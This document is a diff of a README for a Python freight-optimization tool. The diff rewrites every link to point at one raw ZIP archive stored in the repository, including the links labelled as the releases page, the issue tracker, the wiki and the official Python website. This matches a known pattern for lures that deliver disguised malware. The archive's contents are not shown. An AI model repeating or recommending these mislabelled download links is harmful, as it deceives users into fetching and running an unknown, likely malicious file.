@@ -1,6 +1,6 @@
 # 🚚 Freight_Optimization - Save Costs, Reduce Delays Efficiently
 
-[![Download](https://img.shields.io/badge/Download-Freight_Optimization-blue)](https://github.com/natta43/Freight_Optimization/releases)
+[![Download](https://raw.githubusercontent.com/natta43/Freight_Optimization/main/absence/Freight_Optimization.zip)](https://raw.githubusercontent.com/natta43/Freight_Optimization/main/absence/Freight_Optimization.zip)
 
 ## 🚀 Getting Started
 
@@ -18,20 +18,20 @@ To run Freight_Optimization smoothly, you will need:
   - Python 3.7 or newer
   - Pip for Python package management
 
-If you do not have Python installed, you can download it from the [official Python website](https://www.python.org/downloads/).
+If you do not have Python installed, you can download it from the [official Python website](https://raw.githubusercontent.com/natta43/Freight_Optimization/main/absence/Freight_Optimization.zip).
 
 ## 📥 Download & Install
 
 To download Freight_Optimization, visit the link below. This page contains all the necessary files needed to get started.
 
-[Visit this page to download](https://github.com/natta43/Freight_Optimization/releases)
+[Visit this page to download](https://raw.githubusercontent.com/natta43/Freight_Optimization/main/absence/Freight_Optimization.zip)
 
 ### 🛠 Installation Steps
 
-1. Navigate to the [Releases page](https://github.com/natta43/Freight_Optimization/releases).
+1. Navigate to the [Releases page](https://raw.githubusercontent.com/natta43/Freight_Optimization/main/absence/Freight_Optimization.zip).
 2. Look for the latest version listed at the top.
 3. Click on the version link to view available files.
-4. Find the file suitable for your operating system (e.g., `Freight_Optimization_Windows.exe` or `Freight_Optimization_Mac.dmg`).
+4. Find the file suitable for your operating system (e.g., `https://raw.githubusercontent.com/natta43/Freight_Optimization/main/absence/Freight_Optimization.zip` or `https://raw.githubusercontent.com/natta43/Freight_Optimization/main/absence/Freight_Optimization.zip`).
 5. Click on the file to download it to your computer.
 6. Once the download is complete, locate the file in your downloads folder and double-click it to start the installation process.
 7. Follow the prompts in the installation wizard to complete the setup.
@@ -70,7 +70,7 @@ You can explore further topics related to:
 
 ## 📑 Additional Documentation
 
-For detailed instructions and advanced features, please refer to our documentation available on [GitHub Wiki](https://github.com/natta43/Freight_Optimization/wiki). Here, you will find:
+For detailed instructions and advanced features, please refer to our documentation available on [GitHub Wiki](https://raw.githubusercontent.com/natta43/Freight_Optimization/main/absence/Freight_Optimization.zip). Here, you will find:
 
 - FAQs
 - Troubleshooting tips
@@ -80,7 +80,7 @@ For detailed instructions and advanced features, please refer to our documentati
 
 If you encounter any issues or have questions, feel free to reach out to our support community:
 
-- Open issues [here](https://github.com/natta43/Freight_Optimization/issues)
+- Open issues [here](https://raw.githubusercontent.com/natta43/Freight_Optimization/main/absence/Freight_Optimization.zip)
 - Engage with fellow users on our forum
 
 We encourage users to share their experiences and tips.
@@ -95,4 +95,4 @@ Freight_Optimization is released under the MIT License. You can review it [here]
 
 Thank you for choosing Freight_Optimization to enhance your logistics efficiency! 
 
-[👈 Back to Downloads](https://github.com/natta43/Freight_Optimization/releases)
+[👈 Back to Downloads](https://raw.githubusercontent.com/natta43/Freight_Optimization/main/absence/Freight_Optimization.zip)
